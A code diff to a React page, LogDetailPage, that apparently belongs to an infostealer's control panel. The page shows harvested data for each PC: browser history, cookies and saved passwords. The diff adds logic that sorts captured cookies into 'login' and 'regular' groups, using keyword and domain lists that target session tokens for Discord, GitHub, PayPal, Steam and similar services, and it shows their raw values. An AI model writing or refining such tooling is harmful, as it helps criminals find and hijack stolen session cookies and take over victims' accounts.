@@ -520,269 +520,245 @@ const LogDetailPage = () => {
         return searchText.includes(queryLower);
     }, [debouncedSearchQuery, queryLower]);
 
-    const renderCookiesTable = (cookies) => {
-        if (!cookies || cookies.length === 0) {
-            return <Typography sx={{ p: 2, color: '#94a3b8' }}>No browser cookies found.</Typography>;
+    // Helper function to render a cookie table
+    const renderCookieTableContent = (cookieList) => {
+        if (!cookieList || cookieList.length === 0) {
+            return <Typography sx={{ p: 2, color: '#94a3b8' }}>No cookies found.</Typography>;
         }
 
-        // Filter cookies based on search query (optimized with debouncing)
-        let filteredCookies = cookies;
-        if (debouncedSearchQuery) {
-            filteredCookies = cookies.filter(cookie => 
-                matchesSearch(cookie.host) || 
-                matchesSearch(cookie.name) || 
-                matchesSearch(cookie.value) ||
-                matchesSearch(cookie.path)
-            );
-        }
+        return (
+            <TableContainer 
+                component={Paper} 
+                sx={{ 
+                    backgroundColor: '#252b3b', 
+                    border: '1px solid #334155',
+                    borderRadius: '12px',
+                    overflow: 'hidden',
+                }}
+            >
+                <Table size="small">
+                    <TableHead>
+                        <TableRow>
+                            <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Host</TableCell>
+                            <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Name</TableCell>
+                            <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Path</TableCell>
+                            <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Value</TableCell>
+                            <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Expires</TableCell>
+                            <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Secure</TableCell>
+                            <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>HttpOnly</TableCell>
+                        </TableRow>
+                    </TableHead>
+                    <TableBody>
+                        {cookieList.map((cookie, index) => {
+                            const cookieText = `${cookie.host || cookie.domain || ''} ${cookie.name || ''} ${cookie.value || ''}`;
+                            const expirationInfo = cookie.expirationInfo;
+                            
+                            return (
+                                <TableRow key={index} sx={{
+                                    backgroundColor: isImportant(cookieText) 
+                                        ? 'rgba(74, 222, 128, 0.1)' 
+                                        : cookie.expirationInfo.isExpired
+                                            ? 'rgba(239, 68, 68, 0.05)'
+                                            : 'inherit',
+                                    opacity: cookie.expirationInfo.isExpired ? 0.7 : 1,
+                                    '&:hover': {
+                                        backgroundColor: 'rgba(255, 255, 255, 0.03)',
+                                    }
+                                }}>
+                                    <TableCell sx={{ color: '#e2e8f0', wordBreak: 'break-all' }}>
+                                        {cookie.host || cookie.domain || 'N/A'}
+                                        {cookie.browser && <Chip label={cookie.browser} size="small" sx={{ ml: 1, height: '18px', fontSize: '0.65rem', backgroundColor: '#334155', color: '#94a3b8' }} />}
+                                    </TableCell>
+                                    <TableCell sx={{ color: '#e2e8f0' }}>{cookie.name || 'N/A'}</TableCell>
+                                    <TableCell sx={{ color: '#94a3b8' }}>{cookie.path || 'N/A'}</TableCell>
+                                    <TableCell sx={{ color: '#94a3b8', wordBreak: 'break-all', maxWidth: '300px' }}>{cookie.value || 'N/A'}</TableCell>
+                                    <TableCell sx={{ 
+                                        color: cookie.expirationInfo.isExpired ? '#ef4444' : '#4ade80',
+                                        fontWeight: cookie.expirationInfo.isExpired ? 400 : 500
+                                    }}>
+                                        {expirationInfo.dateString}
+                                    </TableCell>
+                                    <TableCell sx={{ color: (cookie.secure || cookie.isSecure) ? '#4ade80' : '#94a3b8' }}>
+                                        {(cookie.secure || cookie.isSecure) ? 'Yes' : 'No'}
+                                    </TableCell>
+                                    <TableCell sx={{ color: (cookie.httpOnly || cookie.isHttpOnly) ? '#4ade80' : '#94a3b8' }}>
+                                        {(cookie.httpOnly || cookie.isHttpOnly) ? 'Yes' : 'No'}
+                                    </TableCell>
+                                </TableRow>
+                            );
+                        })}
+                    </TableBody>
+                </Table>
+            </TableContainer>
+        );
+    };
 
-        if (filteredCookies.length === 0 && debouncedSearchQuery) {
-            return <Typography sx={{ p: 2, color: '#94a3b8' }}>No cookies match your search query.</Typography>;
+    // Helper function to parse expiration date and check if expired
+    // Handles different browser formats: Chrome (Windows epoch microseconds), Firefox (Unix timestamp seconds), etc.
+    const parseExpiration = (cookie) => {
+        // Try different expiration field names
+        let expires = cookie.expires || cookie.expires_utc || cookie.expirationDate || cookie.expiry;
+        
+        if (!expires || expires === 0) {
+            return { date: null, isExpired: false, dateString: 'Session Cookie' };
         }
-
-        // Helper function to parse expiration date and check if expired
-        // Handles different browser formats: Chrome (Windows epoch microseconds), Firefox (Unix timestamp seconds), etc.
-        const parseExpiration = (cookie) => {
-            // Try different expiration field names
-            let expires = cookie.expires || cookie.expires_utc || cookie.expirationDate || cookie.expiry;
+        
+        try {
+            let expiresDate: Date;
             
-            if (!expires || expires === 0) {
-                return { date: null, isExpired: false, dateString: 'Session Cookie' };
+            // Check if it's a Unix timestamp (seconds) - Firefox format
+            if (expires < 1000000000000) {
+                // Unix timestamp in seconds - convert to milliseconds
+                expiresDate = new Date(expires * 1000);
+            } 
+            // Check if it's a Unix timestamp (milliseconds) - some browsers
+            else if (expires < 1000000000000000) {
+                // Unix timestamp in milliseconds
+                expiresDate = new Date(expires);
+            }
+            // Chrome format: Windows epoch in microseconds
+            else {
+                const WINDOWS_EPOCH_DIFF_MS = 11644473600000;
+                // Convert microseconds to milliseconds, then subtract epoch difference
+                const expiresMs = (expires / 1000000) - WINDOWS_EPOCH_DIFF_MS;
+                expiresDate = new Date(expiresMs);
             }
             
+            // Validate the date is reasonable
+            if (isNaN(expiresDate.getTime())) {
+                console.warn('Invalid expiration date from expires:', expires);
+                return { date: null, isExpired: false, dateString: `Invalid (${expires})` };
+            }
+            
+            const now = new Date();
+            const isExpired = expiresDate < now;
+            
+            return {
+                date: expiresDate,
+                isExpired: isExpired,
+                dateString: expiresDate.toLocaleString()
+            };
+        } catch (e) {
+            console.error('Error parsing expiration:', e, 'expires value:', expires);
+            return { date: null, isExpired: false, dateString: `Error: ${expires}` };
+        }
+    };
+
+    // Helper function to detect if a cookie is a login/authentication cookie
+    const isLoginCookie = (cookie) => {
+        const cookieName = (cookie.name || '').toLowerCase();
+        const cookieHost = ((cookie.host || cookie.domain || '')).toLowerCase();
+        
+        // Common login/authentication cookie name patterns
+        const loginPatterns = [
+            'session', 'auth', 'token', 'login', 'access', 'refresh', 
+            'jwt', 'bearer', 'oauth', 'sso', 'identity', 'credential',
+            'authentication', 'authorization', 'csrf', 'xsrf', 'sid',
+            'remember', 'rememberme', 'logged', 'userid', 'username',
+            'password', 'passwd', 'apikey', 'apisecret', 'secret',
+            'sessionid', 'session_id', 'sessid', 'sess', 'ses'
+        ];
+        
+        // Check if cookie name contains any login pattern
+        const nameMatches = loginPatterns.some(pattern => cookieName.includes(pattern));
+        
+        // Check for common authentication domains
+        const authDomains = [
+            'auth', 'login', 'account', 'identity', 'sso', 'oauth',
+            'discord.com', 'github.com', 'google.com', 'facebook.com',
+            'twitter.com', 'microsoft.com', 'apple.com', 'amazon.com',
+            'paypal.com', 'steamcommunity.com', 'epicgames.com'
+        ];
+        
+        const domainMatches = authDomains.some(domain => cookieHost.includes(domain));
+        
+        // Session cookies (no expiration) with HttpOnly are often login cookies
+        const expires = cookie.expires || cookie.expires_utc || cookie.expirationDate || cookie.expiry;
+        const isSessionCookie = !expires || expires === 0;
+        const isHttpOnly = (cookie.httpOnly || cookie.isHttpOnly) === true;
+        
+        return nameMatches || domainMatches || (isSessionCookie && isHttpOnly);
+    };
+
+    // Process and separate cookies into login and regular
+    const processCookies = (cookies) => {
+        if (!cookies) {
+            return { loginCookies: [], regularCookies: [] };
+        }
+
+        // Parse cookies from string if needed
+        let cookieArray = [];
+        if (typeof cookies === 'string') {
             try {
-                let expiresDate: Date;
-                
-                // Check if it's a Unix timestamp (seconds) - Firefox format
-                if (expires < 1000000000000) {
-                    // Unix timestamp in seconds - convert to milliseconds
-                    expiresDate = new Date(expires * 1000);
-                } 
-                // Check if it's a Unix timestamp (milliseconds) - some browsers
-                else if (expires < 1000000000000000) {
-                    // Unix timestamp in milliseconds
-                    expiresDate = new Date(expires);
-                }
-                // Chrome format: Windows epoch in microseconds
-                else {
-                    const WINDOWS_EPOCH_DIFF_MS = 11644473600000;
-                    // Convert microseconds to milliseconds, then subtract epoch difference
-                    const expiresMs = (expires / 1000000) - WINDOWS_EPOCH_DIFF_MS;
-                    expiresDate = new Date(expiresMs);
-                }
-                
-                // Validate the date is reasonable
-                if (isNaN(expiresDate.getTime())) {
-                    console.warn('Invalid expiration date from expires:', expires);
-                    return { date: null, isExpired: false, dateString: `Invalid (${expires})` };
-                }
-                
-                const now = new Date();
-                const isExpired = expiresDate < now;
-                
-                return {
-                    date: expiresDate,
-                    isExpired: isExpired,
-                    dateString: expiresDate.toLocaleString()
-                };
+                cookieArray = JSON.parse(cookies);
             } catch (e) {
-                console.error('Error parsing expiration:', e, 'expires value:', expires);
-                return { date: null, isExpired: false, dateString: `Error: ${expires}` };
+                return { loginCookies: [], regularCookies: [] };
             }
-        };
+        } else if (Array.isArray(cookies)) {
+            cookieArray = cookies;
+        } else {
+            return { loginCookies: [], regularCookies: [] };
+        }
 
-        // Sort cookies: non-expired first, then expired (across all cookies, not just within categories)
-        const sortedCookies = [...filteredCookies].map(cookie => ({
+        if (cookieArray.length === 0) {
+            return { loginCookies: [], regularCookies: [] };
+        }
+
+        // Add expiration info and sort
+        const processedCookies = cookieArray.map(cookie => ({
             ...cookie,
             expirationInfo: parseExpiration(cookie)
         })).sort((a, b) => {
-            // Non-expired cookies first (regardless of login/regular type)
+            // Non-expired cookies first
             if (!a.expirationInfo.isExpired && b.expirationInfo.isExpired) return -1;
             if (a.expirationInfo.isExpired && !b.expirationInfo.isExpired) return 1;
-            // If both have same expiration status, sort by expiration date (earliest first for non-expired, latest first for expired)
+            // If both have same expiration status, sort by expiration date
             if (a.expirationInfo.date && b.expirationInfo.date) {
                 if (!a.expirationInfo.isExpired) {
-                    // For non-expired: earliest expiration first
                     return a.expirationInfo.date.getTime() - b.expirationInfo.date.getTime();
                 } else {
-                    // For expired: most recent expiration first
                     return b.expirationInfo.date.getTime() - a.expirationInfo.date.getTime();
                 }
             }
             return 0;
         });
 
-        // Helper function to detect if a cookie is a login/authentication cookie
-        const isLoginCookie = (cookie) => {
-            const cookieName = (cookie.name || '').toLowerCase();
-            const cookieHost = (cookie.host || '').toLowerCase();
-            
-            // Common login/authentication cookie name patterns
-            const loginPatterns = [
-                'session', 'auth', 'token', 'login', 'access', 'refresh', 
-                'jwt', 'bearer', 'oauth', 'sso', 'identity', 'credential',
-                'authentication', 'authorization', 'csrf', 'xsrf', 'sid',
-                'remember', 'rememberme', 'logged', 'userid', 'username',
-                'password', 'passwd', 'apikey', 'apisecret', 'secret'
-            ];
-            
-            // Check if cookie name contains any login pattern
-            const nameMatches = loginPatterns.some(pattern => cookieName.includes(pattern));
-            
-            // Check for common authentication domains
-            const authDomains = [
-                'auth', 'login', 'account', 'identity', 'sso', 'oauth',
-                'discord.com', 'github.com', 'google.com', 'facebook.com',
-                'twitter.com', 'microsoft.com', 'apple.com'
-            ];
-            
-            const domainMatches = authDomains.some(domain => cookieHost.includes(domain));
-            
-            // Session cookies (no expiration) are often login cookies
-            const isSessionCookie = !cookie.expires || cookie.expires === 0;
-            
-            // HttpOnly cookies are often authentication cookies
-            const isHttpOnly = cookie.httpOnly === true;
-            
-            return nameMatches || domainMatches || (isSessionCookie && isHttpOnly);
-        };
+        // Filter based on search query
+        let filteredCookies = processedCookies;
+        if (debouncedSearchQuery) {
+            filteredCookies = processedCookies.filter(cookie => 
+                matchesSearch(cookie.host || cookie.domain) || 
+                matchesSearch(cookie.name) || 
+                matchesSearch(cookie.value) ||
+                matchesSearch(cookie.path)
+            );
+        }
 
-        // Separate cookies into login and regular cookies
-        // But keep non-expired cookies at the top regardless of type
-        const activeCookies = sortedCookies.filter(c => !c.expirationInfo.isExpired);
-        const expiredCookies = sortedCookies.filter(c => c.expirationInfo.isExpired);
-        
-        // Then separate active/expired into login and regular
-        const activeLoginCookies = activeCookies.filter(c => isLoginCookie(c));
-        const activeRegularCookies = activeCookies.filter(c => !isLoginCookie(c));
-        const expiredLoginCookies = expiredCookies.filter(c => isLoginCookie(c));
-        const expiredRegularCookies = expiredCookies.filter(c => !isLoginCookie(c));
+        // Separate into login and regular
+        const loginCookies = filteredCookies.filter(c => isLoginCookie(c));
+        const regularCookies = filteredCookies.filter(c => !isLoginCookie(c));
 
-        const renderCookieTable = (cookieList, title, showTitle = false, isFirstInSection = false, isLastInSection = false) => (
-            <>
-                        {showTitle && cookieList.length > 0 && (
-                            <Typography 
-                                variant="subtitle1" 
-                                sx={{ 
-                                    mb: 1, 
-                                    mt: isFirstInSection ? 0 : 3,
-                                    fontWeight: 'bold', 
-                                    color: title.includes('Active') ? '#4ade80' : '#ef4444'
-                                }}
-                            >
-                                {title} ({cookieList.length})
-                            </Typography>
-                        )}
-                        {cookieList.length > 0 && (
-                            <TableContainer 
-                                component={Paper} 
-                                sx={{ 
-                                    backgroundColor: '#252b3b', 
-                                    border: '1px solid #334155',
-                                    borderRadius: '12px',
-                                    overflow: 'hidden',
-                                    mb: isLastInSection ? 0 : 2
-                                }}
-                            >
-                                <Table size="small">
-                                    <TableHead>
-                                        <TableRow>
-                                            <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Host</TableCell>
-                                            <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Name</TableCell>
-                                            <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Path</TableCell>
-                                            <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Value</TableCell>
-                                            <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Expires</TableCell>
-                                            <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Secure</TableCell>
-                                            <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>HttpOnly</TableCell>
-                                        </TableRow>
-                                    </TableHead>
-                                    <TableBody>
-                                        {cookieList.map((cookie, index) => {
-                                            const cookieText = `${cookie.host || ''} ${cookie.name || ''} ${cookie.value || ''}`;
-                                            const expirationInfo = cookie.expirationInfo;
-                                            
-                                            return (
-                                                <TableRow key={index} sx={{
-                                                    backgroundColor: isImportant(cookieText) 
-                                                        ? 'rgba(74, 222, 128, 0.1)' 
-                                                        : cookie.expirationInfo.isExpired
-                                                            ? 'rgba(239, 68, 68, 0.05)'
-                                                            : 'inherit',
-                                                    opacity: cookie.expirationInfo.isExpired ? 0.7 : 1,
-                                                    '&:hover': {
-                                                        backgroundColor: 'rgba(255, 255, 255, 0.03)',
-                                                    }
-                                                }}>
-                                                    <TableCell sx={{ color: '#e2e8f0', wordBreak: 'break-all' }}>
-                                                        {cookie.host || cookie.domain || 'N/A'}
-                                                        {cookie.browser && <Chip label={cookie.browser} size="small" sx={{ ml: 1, height: '18px', fontSize: '0.65rem', backgroundColor: '#334155', color: '#94a3b8' }} />}
-                                                    </TableCell>
-                                                    <TableCell sx={{ color: '#e2e8f0' }}>{cookie.name || 'N/A'}</TableCell>
-                                                    <TableCell sx={{ color: '#94a3b8' }}>{cookie.path || 'N/A'}</TableCell>
-                                                    <TableCell sx={{ color: '#94a3b8', wordBreak: 'break-all', maxWidth: '300px' }}>{cookie.value || 'N/A'}</TableCell>
-                                                    <TableCell sx={{ 
-                                                        color: cookie.expirationInfo.isExpired ? '#ef4444' : '#4ade80',
-                                                        fontWeight: cookie.expirationInfo.isExpired ? 400 : 500
-                                                    }}>
-                                                        {expirationInfo.dateString}
-                                                    </TableCell>
-                                                    <TableCell sx={{ color: (cookie.secure || cookie.isSecure) ? '#4ade80' : '#94a3b8' }}>
-                                                        {(cookie.secure || cookie.isSecure) ? 'Yes' : 'No'}
-                                                    </TableCell>
-                                                    <TableCell sx={{ color: (cookie.httpOnly || cookie.isHttpOnly) ? '#4ade80' : '#94a3b8' }}>
-                                                        {(cookie.httpOnly || cookie.isHttpOnly) ? 'Yes' : 'No'}
-                                                    </TableCell>
-                                                </TableRow>
-                                            );
-                                        })}
-                                    </TableBody>
-                                </Table>
-                            </TableContainer>
-                        )}
-            </>
-        );
+        return { loginCookies, regularCookies };
+    };
 
-        return (
-            <Box>
-                {/* Login Cookies Section */}
-                {(activeLoginCookies.length > 0 || expiredLoginCookies.length > 0) && (
-                    <>
-                        <Typography 
-                            variant="h6" 
-                            sx={{ 
-                                mt: 2,
-                                mb: 2, 
-                                fontWeight: 'bold', 
-                                color: '#60a5fa'
-                            }}
-                        >
-                            Login/Authentication Cookies
-                        </Typography>
-                        {renderCookieTable(activeLoginCookies, 'Active Login Cookies', true, true, expiredLoginCookies.length === 0)}
-                        {renderCookieTable(expiredLoginCookies, 'Expired Login Cookies', true, false, true)}
-                    </>
-                )}
-                
-                {/* Regular Cookies Section */}
-                {(activeRegularCookies.length > 0 || expiredRegularCookies.length > 0) && (
-                    <>
-                        <Typography 
-                            variant="h6" 
-                            sx={{ 
-                                mt: activeLoginCookies.length > 0 || expiredLoginCookies.length > 0 ? 4 : 2,
-                                mb: 2, 
-                                fontWeight: 'bold', 
-                                color: '#4ade80'
-                            }}
-                        >
-                            Regular Cookies
-                        </Typography>
-                        {renderCookieTable(activeRegularCookies, 'Active Cookies', true, true, expiredRegularCookies.length === 0)}
-                        {renderCookieTable(expiredRegularCookies, 'Expired Cookies', true, false, true)}
-                    </>
-                )}
-            </Box>
-        );
+    const renderLoginCookies = (cookies) => {
+        const { loginCookies } = processCookies(cookies);
+
+        if (loginCookies.length === 0) {
+            return <Typography sx={{ p: 2, color: '#94a3b8' }}>No login cookies found.</Typography>;
+        }
+
+        return renderCookieTableContent(loginCookies);
+    };
+
+    const renderRegularCookies = (cookies) => {
+        const { regularCookies } = processCookies(cookies);
+
+        if (regularCookies.length === 0) {
+            return <Typography sx={{ p: 2, color: '#94a3b8' }}>No regular cookies found.</Typography>;
+        }
+
+        return renderCookieTableContent(regularCookies);
     };
 
     const renderSavedPasswords = (passwords) => {
@@ -1374,8 +1350,8 @@ const LogDetailPage = () => {
                 data={pcData.browserHistory} 
                 renderFunction={renderBrowserHistory} 
             />
-            <DataSection 
-                title={`Browser Cookies (${(() => {
+            {(() => {
+                const cookieCount = (() => {
                     if (!pcData.browserCookies) return 0;
                     if (Array.isArray(pcData.browserCookies)) return pcData.browserCookies.length;
                     if (typeof pcData.browserCookies === 'string') {
@@ -1387,10 +1363,25 @@ const LogDetailPage = () => {
                         }
                     }
                     return 0;
-                })()})`} 
-                data={pcData.browserCookies} 
-                renderFunction={renderCookiesTable} 
-            />
+                })();
+                
+                const { loginCookies, regularCookies } = processCookies(pcData.browserCookies);
+                
+                return (
+                    <>
+                        <DataSection 
+                            title={`Login Cookies (${loginCookies.length})`} 
+                            data={pcData.browserCookies} 
+                            renderFunction={renderLoginCookies} 
+                        />
+                        <DataSection 
+                            title={`Regular Cookies (${regularCookies.length})`} 
+                            data={pcData.browserCookies} 
+                            renderFunction={renderRegularCookies} 
+                        />
+                    </>
+                );
+            })()}
             <DataSection 
                 title={`Saved Passwords (${pcData.savedPasswords?.length || 0})`} 
                 data={pcData.savedPasswords} 
